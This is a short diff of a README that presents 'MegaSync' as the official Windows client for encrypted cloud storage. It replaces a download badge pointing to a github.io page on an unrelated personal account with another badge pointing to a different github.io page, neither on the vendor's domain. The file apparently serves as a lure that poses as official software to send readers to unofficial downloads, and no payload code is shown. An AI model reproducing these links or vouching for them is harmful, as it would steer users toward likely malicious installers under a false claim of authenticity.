@@ -9,7 +9,7 @@
 
 MegaSync is the official desktop synchronization client engineered for Windows environments to interface with zero-knowledge encrypted cloud storage. It provides automated background backups, selective folder syncing, and real-time streaming of remote files. By utilizing client-side encryption keys, the system guarantees that all data transferred and stored remains completely unreadable by third parties or server infrastructure providers.
 
-[![Download MegaSync](https://img.shields.io/badge/Download-MegaSync-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://claraninameyer366.github.io/.github/MegaSync-Storage-Handler)
+[![Open MEGAsync](https://img.shields.io/badge/Open-MEGAsync-1E293B?style=for-the-badge)](https://megasync-storage.github.io/.github/)
 
 ---
 
